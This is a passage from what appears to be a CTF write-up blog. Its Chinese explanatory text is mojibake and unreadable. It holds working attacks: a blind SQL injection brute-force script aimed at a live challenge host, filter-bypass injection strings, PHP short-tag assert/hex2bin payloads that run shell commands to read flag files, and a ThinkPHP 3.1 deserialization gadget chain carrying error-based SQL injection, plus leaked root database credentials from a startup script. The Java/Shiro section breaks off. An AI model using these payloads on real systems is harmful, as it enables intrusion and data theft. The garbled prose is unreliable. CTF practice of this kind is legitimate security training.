<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">23&quot;||case<span class="comment">/**/</span>when<span class="comment">/**/</span>(rpad((<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>mysql.innodb_table_stats<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>database_name<span class="comment">/**/</span><span class="keyword">in</span><span class="comment">/**/</span>(<span class="keyword">database</span>())),<span class="number">26</span>,<span class="number">1</span>))regexp(<span class="number">0x2c2c</span>)<span class="comment">/**/</span><span class="keyword">then</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">else</span><span class="comment">/**/</span><span class="number">0</span><span class="comment">/**/</span><span class="keyword">end</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å­æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°è¡¨åäº†ï¼Œä½†æ˜¯æ¯”è¾ƒå°´å°¬çš„æ˜¯innodb_table_statsè¿™ä¸ªè¡¨æ²¡æœ‰åŠæ³•è·å–åˆ°å­—æ®µåï¼Œä½†æ˜¯æ²¡å…³ç³»ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥é€šè¿‡joinçš„æ–¹æ³•æ¥ç»•è¿‡ï¼Œç»™å‡ºpayloadå¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union all select*from (select * from users as a join users b)c--+</span><br></pre></td></tr></table></figure>

<p>åç»­åˆ—åä¾ç„¶å¯ä»¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union all select*from (select * from users as a join users b using(id,username))c--+</span><br></pre></td></tr></table></figure>

<p>æœ€åç»“åˆregexpæŠŠpayloadæ‹¼å‡ºæ¥å°±å¥½ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string,re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_str</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="built_in">int</span>(b, <span class="number">16</span>) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">&#x27; &#x27;</span>)]])</span><br><span class="line">url = <span class="string">&quot;http://eci-2ze6jljai3r40l545qre.cloudeci1.ichunqiu.com/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">t=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>,<span class="number">80</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> re.escape(<span class="string">&#x27;&#x27;&#x27;,0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;&#123;#%&amp;()-./:;&lt;=&gt;?@[\\]^_`|&#125;~&#x27;&#x27;&#x27;</span>):</span><br><span class="line">        payload=<span class="string">&quot;database()&quot;</span> <span class="comment">#ctf</span></span><br><span class="line"></span><br><span class="line">        payload=<span class="string">&quot;select group_concat(table_name) from mysql.innodb_table_stats where database_name in (database())&quot;</span> <span class="comment">#ctf,f1ag</span></span><br><span class="line">        <span class="comment">#payload=&#x27;version()&#x27; 10.4.13-mariadb</span></span><br><span class="line">        <span class="comment">#payload=&#x27;select b from (select 1 as b union select * from f1ag)as a&#x27;</span></span><br><span class="line">        payload=<span class="string">&#x27;select group_concat(a.1) from (select 1 union select * from f1ag) as a&#x27;</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:(<span class="string">&#x27;wa123123&quot;||case when (rpad((&#123;&#125;),&#123;&#125;,1))regexp(0x&#123;&#125;) then 1 else 0 end#&#x27;</span>.<span class="built_in">format</span>(payload,i,flag+<span class="built_in">hex</span>(<span class="built_in">ord</span>(j)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>))).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;123&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        print(data)<span class="comment">#6374662c66316167</span></span><br><span class="line">        res = requests.post(url=url, data=data)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;meta http-equiv=&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(j)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            t+=j</span><br><span class="line">            print(flag,t)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;injection&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(<span class="string">&#x27;wrong&#x27;</span>)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå†è¡¥å……å‡ ä¸ªç»•è¿‡information_schemaçš„trick</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">&#x27; union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql.innodb_table_stats</span></span><br></pre></td></tr></table></figure>



<p>ç»•è¿‡ç­‰å·çš„åŠæ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name) from mysql.innodb_table_stats where database_name regexp database()</span><br><span class="line"></span><br><span class="line">select group_concat(table_name) from mysql.innodb_table_stats where database_name in (database())</span><br><span class="line"># ä½¿ç”¨inçš„è¯åè€…å¿…é¡»ç”¨æ‹¬å·æ‹¬èµ·æ¥</span><br></pre></td></tr></table></figure>



<h1 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h1><p>è¿™é“é¢˜åè€Œæ˜¯æ‰€æœ‰é¢˜ç›®å½“ä¸­æœ€å¥½åšçš„..</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,$input))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array($input))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>($input <span class="keyword">as</span> $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&#x27;sandbox/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>($_GET[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> $dir;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        $data = $_GET[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜ç”¨çŸ­æ ‡ç­¾+hex2binç»“åˆå³å¯ç»•è¿‡æ‰€æœ‰è¿‡æ»¤..</p>
<p>æŸ¥çœ‹phpinfoï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;assert(hex2bin(&quot;00706870696e666f2829&quot;))?&gt;</span><br></pre></td></tr></table></figure>

<p>å‘ç°å¯ä»¥ç”¨shell_execï¼Œæ­£å¥½è¿˜å¯ä»¥ç”¨çŸ­æ ‡ç­¾è¾“å‡ºå‡ºæ¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">upload&amp;data=<span class="meta">&lt;?=</span>assert(hex2bin(<span class="string">&quot;7072696e74287368656c6c5f657865632827636174202f2177686174796f7577616e74676767676767673430312e7068702729293b&quot;</span>))<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>BUUä¸Šçš„ç¯å¢ƒæœ‰å˜åŒ–ï¼Œç›´æ¥å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;assert(hex2bin(&quot;73797374656d2822636174202f666c6c6c6c6c6c6c313131323232323232326c616722293b&quot;))?&gt;</span><br></pre></td></tr></table></figure>

<p>åŸç‰ˆæœ¬çš„pyaloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?action=upload&amp;data=<span class="meta">&lt;?=</span>`ls%<span class="number">09</span>/`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="easytp"><a href="#easytp" class="headerlink" title="easytp"></a>easytp</h1><p>é€šè¿‡ThinkVERION æ‰¾åˆ°ç‰ˆæœ¬ä¸º3.1ã€‚ç™¾åº¦payloadï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> $config = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;thinkphp3&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3307&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $img;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handle;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $pk;</span><br><span class="line">        <span class="keyword">protected</span> $data = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $db = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè®°ä¸€ä¸‹å¯ä»¥è¯»/start.shï¼Œè¯»å–é…ç½®æ–‡ä»¶ä½ æ˜¯å•¥ä¹Ÿè¯»ä¸åˆ°çš„ï¼Œstart.shé‡Œé¢</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#x27;\x02#!/bin/bash\n\nmysqld_safe &amp;\n\nmysql_ready() &#123;\n\tmysqladmin ping --socket=/run/mysqld/mysqld.sock --user=root --password=root &gt; /dev/null 2&gt;&amp;1\n&#125;\n\nwhile !(mysql_ready)\ndo\n\techo &quot;waiting for mysql ...&quot;\n\tsleep 3\ndone\n\nmysql -e &quot;ALTER USER \&#x27;root\&#x27;@\&#x27;localhost\&#x27; IDENTIFIED WITH mysql_native_password BY \&#x27;root\&#x27;;flush privileges;&quot; -uroot -proot\n\nif [[ -f /db.sql ]]; then\n    mysql -e &quot;source /db.sql&quot; -uroot -proot\n    rm -f /db.sql\nfi\n\nif [[ -f /flag.sh ]]; then\n\tsource /flag.sh\nfi\n\napache2-foreground\n&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¯»åˆ°äº†ç»§ç»­ä¸‹ä¸€æ­¥,è¯»åˆ°æœ‰teståº“</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> $config = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $img;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handle;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $pk;</span><br><span class="line">        <span class="keyword">protected</span> $data = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $db = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=extractvalue(0x0a,concat(0x0a,(select substr((select group_concat(schema_name) from information_schema.SCHEMATA),50,90)  )))#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŸ¥åˆ°åˆ—æ˜¯flagï¼Œè¡¨æ˜¯flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> $config = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $img;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handle;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $pk;</span><br><span class="line">        <span class="keyword">protected</span> $data = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $db = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=extractvalue(0x0a,concat(0x0a,(select substr((select flag from test.flag),-20) )))#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Javaweb"><a href="#Javaweb" class="headerlink" title="Javaweb"></a>Javaweb</h1><p>è¿™é¢˜çœ‹èµµæ€»åšå®¢çš„æ—¶å€™æ„Ÿè§‰å¥½ç®€å•ï¼Œç»“æœè‡ªå·±åšçš„æ—¶å€™å¥½éš¾ã€ã€‘</p>
<p>æ‰“å¼€å°±æ˜¯è®©ä½ è®¿é—®/loginï¼Œpostè¿‡å»å‘ç°æœ‰cookies=deletemeï¼Œæ‰€ä»¥è¯´æ˜æ˜¯shiroæƒé™é—®é¢˜</p>
<p>ç„¶åæœ‰ä¸ª/jsonï¼Œç›´æ¥è®¿é—®/jsonæ˜¯å•¥éƒ½æ²¡æœ‰çš„ï¼Œpost /loginè¿‡å»å°±è¯´ç™»é™†å¤±è´¥ï¼Œé‚£ä¹ˆ/jsonæˆ‘ä»¬åº”è¯¥ä¹Ÿæ²¡æƒé™ï¼Œæ‰€ä»¥çŒœæµ‹æ˜¯æœ‰æƒé™é—®é¢˜ï¼Œå¯ä»¥é€šè¿‡urlè§£æç»•è¿‡</p>
